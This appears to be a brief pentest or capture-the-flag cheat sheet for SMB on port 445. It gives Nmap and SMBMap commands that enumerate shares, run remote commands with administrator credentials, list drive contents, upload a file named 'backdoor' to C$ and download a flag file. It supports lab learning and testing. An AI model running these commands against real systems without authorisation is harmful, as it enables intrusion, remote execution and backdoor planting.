SMB port 445 is open. We will run Nmap script to list the supported protocols and dialects of an SMB server.
```
nmap -p445 --script smb-protocols IP
```

##### SMBMap to find Shared Folders
We can find all the shares along with their permissions and the comments.

Using a Guest user account
```
smbmap -u guest -p "" -d . -H IP
```

Using an Administrator account
```
smbmap -u administrator -p password -d . -H IP
```

##### Execute the Command on the Target Machine
We can execute the commands on the target machine. This can be abused to gain a normal or meterpreter shell.
```
smbmap -u administrator -p password -d . -H IP -x 'ipconfig'
```

##### Listing all Drives and it's Contents
```
# List Drives
smbmap -u administrator -p password -d . -H IP -L

# List it's Contents
smbmap -u administrator -p password -d . -H IP -r 'C$'
```

##### Uploading and Downloading a file
```
# Uploading
smbmap -u administrator -p password -d . -H IP --upload '/root/backdoor' 'C$\backdoor'

# Downloading
smbmap -u administrator -p password -d . -H IP --download 'C$\flag.txt'
```

